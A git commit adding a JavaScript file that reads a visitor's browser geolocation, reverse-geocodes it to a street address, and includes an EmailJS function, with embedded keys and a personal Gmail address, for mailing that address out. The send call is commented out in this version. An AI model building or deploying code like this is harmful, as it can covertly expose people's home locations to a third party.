b134f85ab4a1e3d65e04223e190bf8471336d027
KlausLynx <113030636+KlausLynx@users.noreply.github.com>
2024-06-24 03:29:30 +0100

    Add files via upload

---
+++ index.js
@@ -0,0 +1,49 @@
+function getLocation() {
+    // emailjs.init('BpiGrXi6jmGAU66nc');
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showLocation);
+    } else {
+        console.log("Geolocation is not supported by this browser.")
+    }
+}
+ function showLocation(position) {
+    let dubemLat = position.coords.latitude
+    let dubemLon = position.coords.longitude
+    console.log("Latitude: " + dubemLat + 
+   " Longitude: " + dubemLon);
+
+    var url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${dubemLat}&lon=${dubemLon}`;
+
+    fetch(url) 
+    .then(response => response.json())
+    .then(data => {
+        if (data && data.address) {
+            console.log('Address: ' + data.display_name);
+            let address = data.display_name
+            console.log(address)
+            // sendAddressEmail('henryvitus543@gmail.com', 'User Location', `My address is: ${address}`);
+        } else {
+            console.log('No results found');
+        }
+    })
+    .catch(error => console.log('Error:', error));
+}
+
+function sendAddressEmail(email, subject, body) {
+    var templateParams = {
+        to_email: email,
+        subject: subject,
+        message: body
+    };
+    emailjs.init('HhEOj9XKqjETk8CZD');
+
+    emailjs.send('service_eiovwrq', 'template_wq64k6y', templateParams)
+        .then(function(response) {
+            console.log('SUCCESS!', response.status, response.text);
+        }, function(error) {
+            console.log('FAILED...', error);
+        });
+}
+
+
+
